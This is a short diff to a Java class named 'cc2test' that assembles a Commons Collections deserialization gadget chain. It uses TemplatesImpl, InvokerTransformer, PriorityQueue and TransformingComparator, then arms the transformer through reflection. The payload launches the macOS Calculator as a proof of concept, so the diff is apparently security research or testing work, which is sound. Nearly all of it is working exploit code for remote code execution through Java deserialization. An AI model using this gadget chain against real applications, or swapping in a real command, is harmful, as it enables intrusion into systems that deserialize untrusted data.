@@ -69,20 +69,20 @@ public class cc2test {
     public static void main(String[] args) throws Exception {
         final Object templates = createTemplatesImpl("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
         // mock method name until armed
-        final InvokerTransformer transformer = new InvokerTransformer("newTransformer", new Class[0], new Object[0]);
+        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
 
         // create queue with numbers and basic comparator
 
         final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
         // stub data for replacement later
-        queue.add(1);
-        queue.add(1);
+        queue.add(templates);
+        queue.add(new VerifyError("nothing"));
 
         // switch method called by comparator
         setFieldValue(transformer, "iMethodName", "newTransformer");
 
         // switch contents of queue
-//		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
+//		final Object[] queueArray = (Object[]) getFieldValue(queue, "queue");
 //		queueArray[0] = templates;
 //		queueArray[1] = 1;
 
